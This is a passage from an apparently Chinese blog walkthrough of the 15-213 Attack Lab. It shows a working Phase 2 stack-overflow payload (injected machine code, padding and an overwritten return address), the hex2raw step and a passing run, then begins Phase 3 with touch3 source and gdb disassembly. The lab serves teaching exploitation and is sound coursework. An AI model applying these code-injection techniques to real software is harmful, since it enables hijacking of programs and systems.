class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>$</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>cat</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2.d</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Phase2.o:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>file</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>format</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>elf64-x86-64</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#B392F0>Disassembly</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>section</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>.text:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0:</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>bf</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>fa</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>97</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>b9</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>59</span><span style=--0:#E1E4E8>          </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x59b997fa</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>5:</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>49</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>c0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ec</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>17</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x4017ec</span><span style=--0:#9ECBFF>,%r8</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>c:</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>41</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ff</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>d0</span><span style=--0:#E1E4E8>                </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>*</span><span style=--0:#9ECBFF>%r8</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="$ cat Phase2.dPhase2.o:     file format elf64-x86-64Disassembly of section .text:   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi   5:   49 c7 c0 ec 17 40 00    mov    $0x4017ec,%r8   c:   41 ff d0                call   *%r8" data-copied=Copied!><div></div></button></div></figure></div><p>然后把十六进制数输入Phase2文件</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=plaintext><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#e1e4e8>/* Phase2 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#e1e4e8>bf fa 97 b9 59          /* mov    $0x59b997fa,%edi */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#e1e4e8>49 c7 c0 ec 17 40 00    /* mov    $0x4017ec,%r8 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#e1e4e8>41 ff d0                /* call   *%r8 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#e1e4e8>/* 以上15字节 */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span style=--0:#e1e4e8>ff ff ff ff ff ff ff ff</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span style=--0:#e1e4e8>78 dc 61 55             /* 返回地址覆写为0x5561dc78 */</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="/* Phase2 */bf fa 97 b9 59          /* mov    $0x59b997fa,%edi */49 c7 c0 ec 17 40 00    /* mov    $0x4017ec,%r8 */41 ff d0                /* call   *%r8 *//* 以上15字节 */ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff78 dc 61 55             /* 返回地址覆写为0x5561dc78 */" data-copied=Copied!><div></div></button></div></figure></div><p>生成字符串</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>mv</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2.s</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2.d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2.o</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>./hex2raw</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>&#x3C;</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>></span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2-raw</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="mv Phase2.s Phase2.d Phase2.o./hex2raw < Phase2 > Phase2-raw" data-copied=Copied!><div></div></button></div></figure></div><p>成功了!</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#B392F0>$</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>./ctarget</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>-qi</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Phase2-raw</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Cookie:</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>0x59b997fa</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span style=--0:#B392F0>Touch2!:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>You</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>called</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch2</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>0x59b997fa</span><span style=--0:#E1E4E8>)</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span style=--0:#B392F0>Valid</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>solution</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>level</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>2</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>with</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>target</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>ctarget</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span style=--0:#B392F0>PASS:</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>Would</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>have</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>posted</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>the</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>following:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>user</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>id</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>bovik</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>course</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>15213-f15</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>lab</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>attacklab</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>        </span><span style=--0:#B392F0>result</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>1:PASS:0xffffffff:ctarget:2:BF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FA</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>97</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>B9</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>59</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>49</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>C7</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>C0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>EC</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>17</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>40</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>00</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>41</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>D0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>FF</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>78</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>DC</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>61</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>55</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="$ ./ctarget -qi Phase2-rawCookie: 0x59b997faTouch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following:        user id bovik        course  15213-f15        lab     attacklab        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 49 C7 C0 EC 17 40 00 41 FF D0 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55" data-copied=Copied!><div></div></button></div></figure></div><h2 id=phase-3>Phase 3</h2><p>Phase2中我给%rdi寄存器赋值传参,而这个问题需要以字符指针传参.</p><div class=expressive-code><figure class=frame><figcaption class=header></figcaption><pre data-language=c><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#F97583>void</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>touch3</span><span style=--0:#E1E4E8>(</span><span style=--0:#F97583>char</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>*</span><span style=--0:#FFAB70>sval</span><span style=--0:#E1E4E8>){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>vlevel </span><span style=--0:#F97583>=</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>3</span><span style=--0:#E1E4E8>;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>if</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>hexmatch</span><span style=--0:#E1E4E8>(cookie, sval)){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>printf</span><span style=--0:#E1E4E8>(</span><span style=--0:#9ECBFF>"Touch3!: You called touch3(</span><span style=--0:#79B8FF>\"%s\"</span><span style=--0:#9ECBFF>)</span><span style=--0:#79B8FF>\n</span><span style=--0:#9ECBFF>"</span><span style=--0:#E1E4E8>, sval);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>validate</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>3</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>}</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>else</span><span style=--0:#E1E4E8>{</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>printf</span><span style=--0:#E1E4E8>(</span><span style=--0:#9ECBFF>"Misfire: You called touch3(</span><span style=--0:#79B8FF>\"%s\"</span><span style=--0:#9ECBFF>)</span><span style=--0:#79B8FF>\n</span><span style=--0:#9ECBFF>"</span><span style=--0:#E1E4E8>, sval);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>    </span><span style=--0:#B392F0>fail</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>3</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span class=indent><span style=--0:#E1E4E8>  </span></span><span style=--0:#E1E4E8>}</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>exit</span><span style=--0:#E1E4E8>(</span><span style=--0:#79B8FF>0</span><span style=--0:#E1E4E8>);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>12</div></div><div class=code><span style=--0:#E1E4E8>}</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>13</div></div><div class=code>
</div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>14</div></div><div class=code><span style=--0:#F97583>int</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>hexmatch</span><span style=--0:#E1E4E8>(</span><span style=--0:#F97583>unsigned</span><span style=--0:#E1E4E8> </span><span style=--0:#FFAB70>val</span><span style=--0:#E1E4E8>, </span><span style=--0:#F97583>char</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>*</span><span style=--0:#FFAB70>sval</span><span style=--0:#E1E4E8>){</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>15</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>char</span><span style=--0:#E1E4E8> </span><span style=--0:#FFAB70>cbuf</span><span style=--0:#E1E4E8>[</span><span style=--0:#79B8FF>110</span><span style=--0:#E1E4E8>];</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>16</div></div><div class=code><span class=indent><span style=--0:#99A0A6>  </span></span><span style=--0:#99A0A6>/* Make position of check string unpredictable */</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>17</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>char</span><span style=--0:#E1E4E8> </span><span style=--0:#F97583>*</span><span style=--0:#E1E4E8>s </span><span style=--0:#F97583>=</span><span style=--0:#E1E4E8> cbuf </span><span style=--0:#F97583>+</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>random</span><span style=--0:#E1E4E8>() </span><span style=--0:#F97583>%</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>100</span><span style=--0:#E1E4E8>;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>18</div></div><div class=code><span class=indent>  </span><span style=--0:#B392F0>sprintf</span><span style=--0:#E1E4E8>(s, </span><span style=--0:#9ECBFF>"</span><span style=--0:#79B8FF>%.8x</span><span style=--0:#9ECBFF>"</span><span style=--0:#E1E4E8>, val);</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>19</div></div><div class=code><span class=indent>  </span><span style=--0:#F97583>return</span><span style=--0:#E1E4E8> </span><span style=--0:#B392F0>strncmp</span><span style=--0:#E1E4E8>(sval, s, </span><span style=--0:#79B8FF>9</span><span style=--0:#E1E4E8>) </span><span style=--0:#F97583>==</span><span style=--0:#E1E4E8> </span><span style=--0:#79B8FF>0</span><span style=--0:#E1E4E8>;</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>20</div></div><div class=code><span style=--0:#E1E4E8>}</span></div></div></code></pre><div class=copy><button title="Copy to clipboard" data-code="void touch3(char *sval){  vlevel = 3;  if(hexmatch(cookie, sval)){    printf(&#x22;Touch3!: You called touch3(\&#x22;%s\&#x22;)\n&#x22;, sval);    validate(3);  }  else{    printf(&#x22;Misfire: You called touch3(\&#x22;%s\&#x22;)\n&#x22;, sval);    fail(3);  }  exit(0);}int hexmatch(unsigned val, char *sval){  char cbuf[110];  /* Make position of check string unpredictable */  char *s = cbuf + random() % 100;  sprintf(s, &#x22;%.8x&#x22;, val);  return strncmp(sval, s, 9) == 0;}" data-copied=Copied!><div></div></button></div></figure></div><p>查看 <code>touch3()</code>函数所在位置</p><div class=expressive-code><figure class="frame is-terminal"><figcaption class=header><span class=title></span><span class=sr-only>Terminal window</span></figcaption><pre data-language=shell><code><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>1</div></div><div class=code><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>gdb</span><span style=--0:#E1E4E8>) </span><span style=--0:#B392F0>disassemble</span><span style=--0:#E1E4E8>  </span><span style=--0:#9ECBFF>touch3</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>2</div></div><div class=code><span style=--0:#B392F0>Dump</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>of</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>assembler</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>code</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>for</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>function</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>touch3:</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>3</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004018fa</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+0>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>push</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>%rbx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>4</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004018fb</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+1>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>%rdi,%rbx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>5</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x00000000004018fe</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+4>:</span><span style=--0:#E1E4E8>     </span><span style=--0:#9ECBFF>movl</span><span style=--0:#E1E4E8>   $0x3</span><span style=--0:#9ECBFF>,0x202bd4</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rip</span><span style=--0:#E1E4E8>)        </span><span style=--0:#99A0A6># 0x6044dc &#x3C;vlevel></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>6</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401908</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+14>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>%rdi,%rsi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>7</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040190b</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+17>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>0x202bd3</span><span style=--0:#E1E4E8>(</span><span style=--0:#B392F0>%rip</span><span style=--0:#E1E4E8>)</span><span style=--0:#9ECBFF>,%edi</span><span style=--0:#E1E4E8>        </span><span style=--0:#99A0A6># 0x6044e4 &#x3C;cookie></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>8</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401911</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+23>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x40184c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;hexmatch></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>9</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401916</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+28>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>test</span><span style=--0:#E1E4E8>   </span><span style=--0:#9ECBFF>%eax,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>10</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401918</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+30>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>je</span><span style=--0:#E1E4E8>     </span><span style=--0:#79B8FF>0x40193d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;touch3+67></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>11</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040191a</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+32>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>%rbx,%rdx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>12</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040191d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+35>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x403138</span><span style=--0:#9ECBFF>,%esi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>13</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401922</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+40>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>14</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401927</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+45>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x0</span><span style=--0:#9ECBFF>,%eax</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>15</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040192c</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+50>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x400df0</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;__printf_chk@plt></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>16</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401931</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+55>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x3</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>17</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401936</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+60>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>call</span><span style=--0:#E1E4E8>   </span><span style=--0:#79B8FF>0x401c8d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;validate></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>18</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040193b</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+65>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>jmp</span><span style=--0:#E1E4E8>    </span><span style=--0:#79B8FF>0x40195e</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;touch3+100></span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>19</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040193d</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+67>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>%rbx,%rdx</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>20</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401940</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+70>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x403160</span><span style=--0:#9ECBFF>,%esi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>21</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x0000000000401945</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+75>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span style=--0:#E1E4E8>    $0x1</span><span style=--0:#9ECBFF>,%edi</span></div></div><div class=ec-line><div class=gutter><div class=ln aria-hidden=true>22</div></div><div class=code><span class=indent>   </span><span style=--0:#B392F0>0x000000000040194a</span><span style=--0:#E1E4E8> </span><span style=--0:#9ECBFF>&#x3C;+80>:</span><span style=--0:#E1E4E8>    </span><span style=--0:#9ECBFF>mov</span><span 